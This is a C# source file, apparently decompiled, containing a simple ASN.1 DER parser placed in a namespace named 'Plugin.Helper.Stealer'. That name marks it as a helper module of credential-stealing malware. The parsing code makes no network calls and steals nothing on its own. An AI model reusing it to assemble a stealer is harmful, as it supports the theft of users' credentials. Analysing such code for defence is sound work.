

using System;
using System.Collections.Generic;


namespace Plugin.Helper.Stealer
{
	public class ASN1DER
	{
		public static ASN1DER.ASN1DERObject Parse(byte[] ASN1DERData)
		{
			ASN1DER.ASN1DERObject asN1DerObject = new ASN1DER.ASN1DERObject(ASN1DER.ASN1DERTypeEnum.None, 0, (byte[]) null);
			for (int index = 0; index < ASN1DERData.Length - 1; ++index)
			{
				int _length = (int) ASN1DERData[index + 1];
				ASN1DER.ASN1DERTypeEnum _type = (ASN1DER.ASN1DERTypeEnum) ASN1DERData[index];
				switch (_type)
				{
					case ASN1DER.ASN1DERTypeEnum.Integer:
					case ASN1DER.ASN1DERTypeEnum.OctetString:
					case ASN1DER.ASN1DERTypeEnum.ObjectIdentifier:
						byte[] numArray1 = new byte[_length];
						int length1 = _length;
						if (_length + (index + 2) > ASN1DERData.Length)
							length1 = ASN1DERData.Length - (index + 2);
						Array.Copy((Array) ASN1DERData, index + 2, (Array) numArray1, 0, length1);
						asN1DerObject.objects.Add(new ASN1DER.ASN1DERObject(_type, _length, numArray1));
						index += _length + 1;
						break;
					case ASN1DER.ASN1DERTypeEnum.Sequence:
						byte[] numArray2;
						if (asN1DerObject.length == 0)
						{
							asN1DerObject.type = ASN1DER.ASN1DERTypeEnum.Sequence;
							asN1DerObject.length = ASN1DERData.Length;
							numArray2 = new byte[ASN1DERData.Length];
						}
						else
						{
							asN1DerObject.objects.Add(new ASN1DER.ASN1DERObject(ASN1DER.ASN1DERTypeEnum.Sequence, _length, (byte[]) null));
							numArray2 = new byte[_length];
						}
						int length2 = ASN1DERData.Length - (index + 2);
						if (numArray2.Length < length2)
							length2 = numArray2.Length;
						Array.Copy((Array) ASN1DERData, index + 2, (Array) numArray2, 0, length2);
						asN1DerObject.objects.Add(ASN1DER.Parse(numArray2));
						index += _length + 1;
						break;
				}
			}
			return asN1DerObject;
		}

		public enum ASN1DERTypeEnum
		{
			None = 0,
			Integer = 2,
			OctetString = 4,
			ObjectIdentifier = 6,
			Sequence = 48, // 0x00000030
		}

		public struct ASN1DERObject
		{
			public ASN1DER.ASN1DERTypeEnum type;
			public int length;
			public List<ASN1DER.ASN1DERObject> objects;
			public byte[] data;

			public ASN1DERObject(ASN1DER.ASN1DERTypeEnum _type, int _length, byte[] _data)
			{
				this.type = _type;
				this.length = _length;
				this.data = _data;
				this.objects = new List<ASN1DER.ASN1DERObject>();
			}
		}
	}
}
